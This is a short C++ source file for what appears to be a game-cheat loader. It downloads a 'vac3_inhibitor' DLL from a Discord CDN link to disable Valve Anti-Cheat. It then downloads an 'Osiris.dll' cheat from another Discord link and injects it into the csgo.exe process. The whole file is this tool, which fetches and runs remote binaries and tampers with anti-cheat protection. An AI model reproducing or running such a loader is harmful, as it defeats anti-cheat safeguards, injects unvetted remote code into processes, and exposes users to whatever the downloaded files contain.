#include "stdafx.hpp"
#include "vac_inhibitor.hpp"
#include "injector.hpp"
#include <windows.h>

int main()
{

	LPCSTR vac_inhibitor_url = "https://cdn.discordapp.com/attachments/1136059719484719175/1147729662701748224/vac3_inhibitor.dll";
	int vacDisabled = !vac_inhibitor(vac_inhibitor_url);

	if (vacDisabled)
	{
		LPCSTR dllUrl = "https://cdn.discordapp.com/attachments/1136059719484719175/1147774626060062730/Osiris.dll";

		int verifyDllLoaded = !injector(dllUrl, "csgo.exe", 1);

		if(verifyDllLoaded)
		{
			Beep(500, 100);
			std::this_thread::sleep_for(std::chrono::milliseconds(100));
			Beep(500, 100);

			ExitProcess(0);
		}

		Beep(300, 100);
	}

	system("PAUSE");
	ExitProcess(1);
}